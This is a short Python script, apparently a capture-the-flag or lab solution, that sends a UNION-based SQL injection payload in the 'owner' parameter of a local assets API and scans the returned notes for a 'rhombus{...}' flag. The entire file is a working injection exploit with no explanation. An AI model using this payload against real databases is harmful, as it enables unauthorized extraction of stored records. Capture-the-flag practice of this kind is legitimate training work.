#!/usr/bin/env python3
import json
import re
import urllib.parse
import urllib.request

payload = "' UNION SELECT id,name,owner,note FROM assets--"
url = "http://127.0.0.1:8083/api/assets?" + urllib.parse.urlencode({"owner": payload})
with urllib.request.urlopen(url) as response:
    result = json.load(response)
for asset in result["assets"]:
    match = re.search(r"rhombus\{[^}]+\}", asset["note"])
    if match and "training" not in match.group():
        print(match.group())
